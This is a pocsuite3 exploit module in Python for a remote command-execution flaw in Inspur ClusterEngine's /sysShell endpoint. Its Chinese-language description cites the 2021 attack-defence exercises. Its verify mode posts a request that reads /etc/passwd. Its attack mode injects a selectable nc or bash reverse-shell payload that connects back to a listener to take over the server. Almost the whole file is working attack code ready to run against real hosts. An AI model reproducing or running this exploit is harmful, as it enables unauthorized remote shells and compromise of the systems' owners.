from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '浪潮sysShell任意命令执行漏洞'
    appName = '浪潮'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2021攻防演习期间，浪潮ClusterEngineV4.0 被爆存在远程命令执行，攻击者通过发送特殊的请求可以获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        try:
            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Cookie": "lang=cn"
            }
            target = self.url+"/sysShell"
            data = "op=doPlease&node=cu01&command=cat /etc/passwd"
            r = requests.post(url=target,timeout=8,verify=False,headers=headers,data=data)
            if r.status_code == 200 and "root" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return
    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        print(cmd)
        try:
            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Cookie": "lang=cn"
            }
            target = self.url+"/sysShell"
            data = "op=doPlease&node=cu01&command="+cmd
            r = requests.post(url=target,timeout=8,verify=False,headers=headers,data=data)
            if r.status_code == 200:
                print(r.text)
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)